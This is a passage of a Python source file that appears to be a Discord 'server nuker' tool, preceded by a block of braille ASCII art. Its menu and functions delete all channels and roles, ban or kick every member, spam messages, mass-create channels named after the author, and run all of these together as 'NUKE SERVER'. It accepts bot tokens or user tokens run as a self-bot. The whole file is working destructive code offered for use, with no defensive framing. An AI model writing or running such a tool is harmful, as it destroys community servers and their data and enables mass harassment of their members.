                    ⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⢈⠴⣫⢷⡹⡾⣽⣻⡵⣏⣎⠸⣘⡷⣯⣟⡾⡵⢎⣿⣽⣿⣯⣟⣿⣿⣿⣿⣿⣿⣿⠀⠠⢌⠃⢀⠎⣴⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⢢⡙⢦⣝⡾⣼⢯⣿⣱⣏⡳⣕⣣⠞⣥⢋⠲⠁⡱⢦⡜⢻⣿⣿⣿⡇⣻⣿⣿⣟⠦⣙⢧⢳⡠⣭⢱⣠⣻⣼⣷⣿⣿⣿⣿⣿⣿⣿⣿⣏⣾⣿⣿⣿⣿⣿⠀
                    ⠀⢨⣽⣿⣿⣿⣿⣧⠀⠀⠂⡜⣱⢏⣷⡻⣷⣏⣿⡳⣌⠒⢬⣻⢷⣯⣟⣱⢫⣾⢿⣿⢷⡿⣿⣿⣿⣿⣿⣿⣷⠀⢣⢎⡳⢎⠀⠋⣾⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⢨⠱⣜⢳⢮⡿⣽⣻⢾⣱⣎⢷⡱⢮⡝⣎⢇⢂⣴⣿⡌⢹⣿⣿⣿⣿⡇⣿⣿⣿⣿⡘⡱⢎⢣⠳⣘⢧⡷⣻⣭⢿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣷⣿⣿⣿⣿⣿⠀
                    ⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠐⣌⢳⢯⡾⣽⣳⣟⣾⡳⢥⠚⢬⣟⡿⣮⢿⡽⣯⢿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠡⣎⠵⡊⢀⢀⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⡈⢆⡳⡜⣯⢾⡽⣷⣻⢯⡷⣞⢧⡝⣶⡹⣜⠮⡄⢻⣿⣿⣿⣿⣿⣿⣿⢧⣿⣿⣿⡷⣱⡹⣌⣦⠽⣜⢾⡼⣽⢯⡿⣽⣿⣿⣿⣿⣿⣿⣿⢧⢻⣿⣿⣿⣿⣿⠀
                    ⠀⢸⣿⣿⣿⣿⣿⣿⠄⠀⠂⠤⣫⢟⡞⠷⢻⣞⣷⣛⠦⣉⠲⣌⢳⡙⢮⡹⣭⢻⢾⣝⡳⣯⣿⣿⣿⣿⣿⣿⡿⠀⡑⢎⡳⢩⠄⢸⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠐⡌⢲⡱⣝⢮⡿⣽⣻⣯⢿⣽⡻⣮⡝⣶⡹⢎⡳⣅⠸⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⡟⣴⣻⣿⣾⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢧⣻⣿⣿⣿⣿⣿⠀
                    ⠀⠸⠿⠿⡿⠿⠿⠛⠀⠀⠀⠄⠁⠈⠀⢀⣠⣟⡾⣝⡲⢄⠳⣬⢇⡏⣗⡳⣭⢻⡾⣭⢷⣿⣿⣿⣿⣿⣿⣿⡇⠀⢜⢪⡕⢣⠌⠀⢻⣿⡟⠉⠀⠀⠀⠠⠈⠀⠀⠀⠁⠈⠑⠃⠟⠾⣽⣻⡷⣿⢯⣷⣻⢧⣛⠶⢹⢧⡓⢮⡄⢹⣿⣿⣿⣿⢿⣿⢸⣿⣿⣿⡟⡴⣿⣿⣿⣿⣯⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡣⢼⣿⣿⣿⣿⣿⠀
                    ⠀⠀⠀⠀⣀⡀⣀⣀⠀⠀⠀⢀⠆⡀⠐⣯⢾⣽⢻⡝⠒⠌⣱⠳⣎⠽⣸⢱⣋⠷⣹⡝⣞⢯⣿⣿⣿⣿⣿⡟⠀⠀⢎⢲⣉⠖⠀⠀⠀⠁⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢟⡾⣵⢻⡌⠃⣸⢲⡹⢦⡹⡀⢿⣿⣿⡇⡏⡿⣾⣿⣿⡿⡝⢼⣻⣯⣿⣷⣿⣟⣿⣟⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡅⠸⢿⣿⣿⣿⣿⠀
                    ⠀⢰⠂⢸⣿⡯⣝⠯⠀⠀⠀⠠⣈⠀⢀⢾⡹⢎⡥⢌⣡⠠⣄⣫⢌⣣⢥⣣⣜⣣⢳⣜⣼⣪⣽⣿⣿⣿⡗⠀⠀⠘⣌⠲⣡⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠈⠃⣠⡞⣷⣋⡗⣣⢇⠵⢸⣿⣿⣯⢁⢇⣿⣿⣯⢷⣜⣤⣏⢷⡹⣎⣳⡝⣾⣹⣿⣷⣿⣾⣿⣿⣿⣿⣿⣿⠂⢰⣿⣿⣿⣿⣿⠀
                    ⠀⠸⠁⠀⣿⣱⣼⣶⠀⠀⡀⠢⣕⠂⠈⣯⢟⣯⣞⠿⣞⣿⣳⢯⣿⡽⣯⣷⣻⣟⣯⣿⣷⣿⣿⣿⣿⡟⠀⠀⠀⢡⢢⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠧⢯⢼⡱⣊⠂⣼⢯⣿⢇⢎⣾⣿⣿⣿⣿⣿⣾⡿⣟⣿⣽⢷⣻⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⢸⣿⣿⣿⣿⣿⠀
                    ⠀⢸⠀⢘⣿⣿⢾⣿⠀⠐⠠⠐⢮⠀⠀⣻⡞⣷⡞⣿⡽⣾⡽⣯⢿⣽⣻⣽⣿⣿⣯⣿⣾⢿⣿⣿⡟⠀⠀⠀⠀⢂⠆⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢖⡣⢁⣼⡟⣾⣿⢫⣾⣿⢿⣿⣿⡿⣿⣽⡿⣿⣟⡿⣟⣿⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⠀
                    ⠀⢸⠀⠈⣿⡿⠛⠋⠀⠈⠄⠀⢯⠀⠀⣳⣟⣳⣟⣷⣻⢷⣻⣯⢿⣯⣿⢿⣯⣿⣟⣿⡿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⡠⣿⣿⣹⣿⢏⣾⣿⣿⣿⣿⡿⣿⣿⣳⣿⣟⡿⣟⣿⢾⣻⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⡍⠒⡀⠌⢉⠀⠡⠁⠀
                    ⠀⠘⠁⠠⠀⠀⠀⠀⠀⠈⠆⢘⡸⠄⠀⣳⢯⣷⣻⢾⡽⣯⢷⣯⣿⣞⣿⣻⣷⢿⣞⣷⣿⣿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠘⢿⢧⣿⠏⡎⣷⣿⡿⣿⣿⢿⣽⣷⡿⢿⣾⣻⣯⣟⣯⢷⢯⣟⣯⢿⡻⣝⢎⠧⣓⡱⢌⠡⠐⡈⠄⡈⠡⠀⠀
                    ⠀⠀⠀⢠⠁⠀⡀⠄⠀⠈⡄⢠⡙⠆⠀⢼⣛⡶⢯⣻⢽⣯⣟⣾⣳⣟⣯⣿⡽⣿⣽⣾⣿⡭⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣂⡀⠘⣿⠏⠀⡇⠉⠃⠉⠉⠉⠋⠉⠁⠁⠈⠁⠉⠈⠁⠈⠙⠾⡼⣘⠧⡓⡜⢬⠓⡥⢚⡄⢂⠡⠐⠠⢀⠡⠀⠀
                    ⠀⠀⠀⠀⠆⠁⠀⠀⠀⠀⠐⠠⡙⠆⠀⠺⣵⣫⢷⣫⣞⢷⣻⣞⡷⣯⣟⣾⡽⣟⣷⣻⡿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⢠⠀⠀⠀⢀⠀⠀⠀⠀⠀⢠⠁⢀⣻⣿⣿⠀⠉⠀⠀⡇⠶⠲⡔⢲⠳⡞⢖⡣⠄⠀⢶⣒⢶⡲⢤⢎⡳⢅⡣⢎⡱⢊⢥⢋⠴⢣⠘⠠⠐⡀⠡⠀⠄⠀⠀
                    ⠀⠀⠀⠀⠐⠈⡀⠐⠀⠀⠀⠀⠈⠀⠀⠀⢣⠟⣮⠳⡝⢯⡳⢏⡟⣳⠯⠿⣽⢻⢯⡟⡿⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠋⠀⢀⣠⠴⠒⠒⠁⠀⠀⢀⠆⠀⠀⠀⠀⠀⠈⡒⣦⡈⣿⡃⠀⠀⠀⡨⡇⢢⠡⢄⡡⢊⠔⡡⢒⠀⠀⠮⡝⢮⡙⠧⣋⠜⢢⠑⡊⠴⠉⢆⠩⠒⠡⠉⠄⡁⠠⠐⠀⠈⠀⠀
                    ⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⢀⠈⡀⢀⠁⡀⢀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⢀⣠⠤⠞⠁⢀⣤⠶⠒⠒⠚⠁⠀⠀⠀⠀⠀⠀⠀⠳⠝⠻⠚⡄⠀⣠⣼⣷⡇⠠⢈⠄⣀⠂⠄⠀⠀⠀⠀⠀⣀⠀⣀⠀⡀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⢂⠐⠀⠀⠈⢀⠀⠀
"""

async def show_art(choice):
    if choice in ['1', '2', '3', '4', '5', '6']:
        print(YELLOW + "=" * 60)
        print(YELLOW + DRAGON)
        print(YELLOW + "=" * 60)
    elif choice in ['7', '8']:
        print(YELLOW + "=" * 60)
        print(YELLOW + FACE)
        print(YELLOW + "=" * 60)
    elif choice == '9':
        print(YELLOW + "=" * 60)
        print(YELLOW + BYE)
        print(YELLOW + "=" * 60)
    elif choice == 'alhrbi':
        print(YELLOW + "=" * 60)
        print(YELLOW + ALHRBI_ART)
        print(YELLOW + "=" * 60)

def print_logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(YELLOW + "=" * 60)
    print(YELLOW + LOGO_MAIN)
    print(YELLOW + "=" * 60)
    print(YELLOW + "by : MaybeRayan")
    print(YELLOW + "Owner : mayberayanalhrbi")
    print(YELLOW + "=" * 60)


async def del_channel(ch):
    try:
        await ch.delete()
        return True
    except:
        return False

async def del_role(r):
    try:
        await r.delete()
        return True
    except:
        return False

async def ban_member(m):
    try:
        await m.ban(reason="Tool", delete_message_days=0)
        return True
    except:
        return False

async def kick_member(m):
    try:
        await m.kick(reason="Tool")
        return True
    except:
        return False

async def create_ch(g, name):
    try:
        return await g.create_text_channel(name=name)
    except:
        return None

async def rename_ch(ch, name):
    try:
        await ch.edit(name=name)
        return True
    except:
        return False

async def send_msg(ch, msg):
    try:
        await ch.send(msg)
        return True
    except:
        return False


async def nuke_guild(g):
    global cancel
    reset_cancel()
    
    printc("[+] Deleting all channels...")
    chs = list(g.channels)
    if chs:
        await asyncio.gather(*[del_channel(ch) for ch in chs], return_exceptions=True)
    printc("[+] Channels deleted")
    
    printc("[+] Deleting all roles...")
    roles = [r for r in g.roles if r.name != "@everyone" and r < g.me.top_role]
    if roles:
        await asyncio.gather(*[del_role(r) for r in roles], return_exceptions=True)
    printc("[+] Roles deleted")
    
    printc("[+] Banning all members...")
    members = [m for m in g.members if m != g.me and m != g.owner and m.top_role < g.me.top_role]
    if members:
        await asyncio.gather(*[ban_member(m) for m in members], return_exceptions=True)
    printc("[+] Members banned")
    
    printc("[+] Creating new channels...")
    channel_names = ["alhrbi", "nuked-by-alhrbi", "alhrbi-was-here", "maybe-alhrbi", "alhrbi-community"]
    await asyncio.gather(*[create_ch(g, random.choice(channel_names)) for _ in range(50)], return_exceptions=True)
    printc("[+] Channels created")
    
    reset_cancel()


async def handle_delete_channels(g):
    global cancel
    reset_cancel()
    await show_art('1')
    printc("[+] Deleting all channels...")
    chs = list(g.channels)
    if not chs:
        printc("[X] No channels found")
        inp("Press Enter...")
        return
    printc(f"[+] Found {len(chs)} channels")
    await asyncio.gather(*[del_channel(ch) for ch in chs], return_exceptions=True)
    printc("[+] All channels deleted")
    printc("[+] Press Enter to return")
    inp("")

async def handle_delete_roles(g):
    global cancel
    reset_cancel()
    await show_art('2')
    printc("[+] Deleting all roles...")
    roles = [r for r in g.roles if r.name != "@everyone" and r < g.me.top_role]
    if not roles:
        printc("[X] No roles found")
        inp("Press Enter...")
        return
    printc(f"[+] Found {len(roles)} roles")
    await asyncio.gather(*[del_role(r) for r in roles], return_exceptions=True)
    printc("[+] All roles deleted")
    printc("[+] Press Enter to return")
    inp("")

async def handle_create_channels(g):
    global cancel
    reset_cancel()
    await show_art('3')
    printc("[+] Creating channels...")
    count = inp("[?] How many? : ").strip()
    if not count.isdigit():
        return
    count = int(count)
    printc(f"[+] Creating {count} channels...")
    await asyncio.gather(*[create_ch(g, random.choice(NAMES)) for _ in range(count)], return_exceptions=True)
    printc(f"[+] Created {count} channels")
    printc("[+] Press Enter to return")
    inp("")
    
async def handle_rename_channels(g):
    global cancel
    reset_cancel()
    await show_art('4')
    printc("[+] Renaming channels...")
    chs = list(g.text_channels)
    if not chs:
        printc("[X] No channels found")
        inp("Press Enter...")
        return
    printc(f"[+] Found {len(chs)} channels")
    await asyncio.gather(*[rename_ch(ch, random.choice(NAMES)) for ch in chs], return_exceptions=True)
    printc(f"[+] Renamed {len(chs)} channels")
    printc("[+] Press Enter to return")
    inp("")

async def handle_rename_custom(g):
    global cancel
    reset_cancel()
    await show_art('5')
    printc("[+] Renaming with custom names...")
    chs = list(g.text_channels)
    if not chs:
        printc("[X] No channels found")
        inp("Press Enter...")
        return
    printc("[+] Enter names separated by dot (.)")
    printc("[+] Example: name1 . name2 . name3")
    print()
    names_in = inp("[?] Names: ").strip()
    if not names_in:
        return
    names = [n.strip() for n in names_in.split('.') if n.strip()]
    if not names:
        printc("[X] No valid names")
        inp("Press Enter...")
        return
    printc(f"[+] Using {len(names)} names")
    printc(f"[+] Renaming {len(chs)} channels...")
    await asyncio.gather(*[rename_ch(ch, names[i % len(names)]) for i, ch in enumerate(chs)], return_exceptions=True)
    printc(f"[+] Renamed {len(chs)} channels")
    printc("[+] Press Enter to return")
    inp("")

async def handle_send_all(g):
    global cancel
    reset_cancel()
    await show_art('6')
    printc("[+] Sending messages...")
    chs = [ch for ch in g.text_channels if ch.permissions_for(g.me).send_messages]
    if not chs:
        printc("[X] No channels found")
        inp("Press Enter...")
        return
    msg = inp("[?] Message: ").strip()
    if not msg:
        return
    count = inp("[?] Per channel: ").strip()
    if not count.isdigit():
        return
    count = int(count)
    tasks = []
    for ch in chs:
        for _ in range(count):
            tasks.append(send_msg(ch, msg))
    await asyncio.gather(*tasks, return_exceptions=True)
    printc(f"[+] Sent {len(tasks)} messages")
    printc("[+] Press Enter to return")
    inp("")

async def handle_ban_all(g):
    global cancel
    reset_cancel()
    await show_art('7')
    printc("[+] Banning all members...")
    members = [m for m in g.members if m != g.me and m != g.owner and m.top_role < g.me.top_role]
    if not members:
        printc("[+] No members to ban")
        inp("Press Enter...")
        return
    printc(f"[+] Banning {len(members)} members...")
    await asyncio.gather(*[ban_member(m) for m in members], return_exceptions=True)
    printc(f"[+] Banned {len(members)} members")
    printc("[+] Press Enter to return")
    inp("")

async def handle_kick_all(g):
    global cancel
    reset_cancel()
    await show_art('8')
    printc("[+] Kicking all members...")
    members = [m for m in g.members if m != g.me and m != g.owner and m.top_role < g.me.top_role]
    if not members:
        printc("[+] No members to kick")
        inp("Press Enter...")
        return
    printc(f"[+] Kicking {len(members)} members...")
    await asyncio.gather(*[kick_member(m) for m in members], return_exceptions=True)
    printc(f"[+] Kicked {len(members)} members")
    printc("[+] Press Enter to return")
    inp("")

async def handle_nuke(g):
    global cancel
    reset_cancel()
    await show_art('9')
    confirm = inp("[!] Are you sure you want to NUKE this server? (y/n): ").strip().lower()
    if confirm == 'y':
        await nuke_guild(g)
        printc("[+] Server Nuked Successfully!")
    else:
        printc("[!] Nuke cancelled")
    printc("[+] Press Enter to return")
    inp("")

async def main_menu(g):
    while True:
        print_logo()
        print(YELLOW + f"Connected Server: {g.name} (ID: {g.id})")
        print(YELLOW + "=" * 60)
        print(YELLOW + "[1] Delete All Channels")
        print(YELLOW + "[2] Delete All Roles")
        print(YELLOW + "[3] Create Mass Channels")
        print(YELLOW + "[4] Mass Rename Channels (Random)")
        print(YELLOW + "[5] Mass Rename Channels (Custom)")
        print(YELLOW + "[6] Mass Send Messages")
        print(YELLOW + "[7] Ban All Members")
        print(YELLOW + "[8] Kick All Members")
        print(YELLOW + "[9] NUKE SERVER")
        print(YELLOW + "[0] Exit")
        print(YELLOW + "=" * 60)

        choice = inp("[?] Choice: ").strip().lower()

        if choice == '1':
            await handle_delete_channels(g)
        elif choice == '2':
            await handle_delete_roles(g)
        elif choice == '3':
            await handle_create_channels(g)
        elif choice == '4':
            await handle_rename_channels(g)
        elif choice == '5':
            await handle_rename_custom(g)
        elif choice == '6':
            await handle_send_all(g)
        elif choice == '7':
            await handle_ban_all(g)
        elif choice == '8':
            await handle_kick_all(g)
        elif choice == '9':
            await handle_nuke(g)
        elif choice == 'alhrbi':
            await show_art('alhrbi')
            inp("Press Enter...")
        elif choice == '0':
            printc("[+] Exiting...")
            await bot.close()
            sys.exit()

async def start():
    global bot
    while True:
        print_logo()
        token = inp("[+] Token: ").strip()
        if not token:
            continue
        try:
            gid = int(inp("[+] Guild ID: ").strip())
        except ValueError:
            printc("[X] Invalid Guild ID!")
            continue
        print()
        printc("1. Bot Token")
        printc("2. User Token (Self-Bot)")
        print()
        choice = inp("[?] Choose: ").strip()
        try:
            if choice == "2":
                bot = commands.Bot(command_prefix="!", self_bot=True, intents=intents)
                @bot.event
                async def on_ready():
                    print_logo()
                    g = bot.get_guild(gid)
                    if g:
                        printc(f"[+] Connected: {g.name}")
                        await main_menu(g)
                    else:
                        printc("[X] Guild not found")
                        await bot.close()
                try:
                    await bot.start(token, bot=False)
                    break
                except Exception as e:
                    printc(f"[X] Connection failed: {e}")
                    continue
            else:
                bot = commands.Bot(command_prefix="!", intents=intents)
                @bot.event
                async def on_ready():
                    print_logo()
                    g = bot.get_guild(gid)
                    if g:
                        printc(f"[+] Connected: {g.name}")
                        await main_menu(g)
                    else:
                        printc("[X] Guild not found")
                        await bot.close()
                try:
                    await bot.start(token)
                    break
                except Exception as e:
                    printc(f"[X] Connection failed: {e}")
                    continue
        except Exception as e:
            printc(f"[X] Error: {e}")
            continue

if __name__ == "__main__":
    try:
        asyncio.run(start())
    except Exception as e:
        print(RED + f"[X] Error: {e}")
        input(YELLOW + "\n[!] Press Enter to exit...")
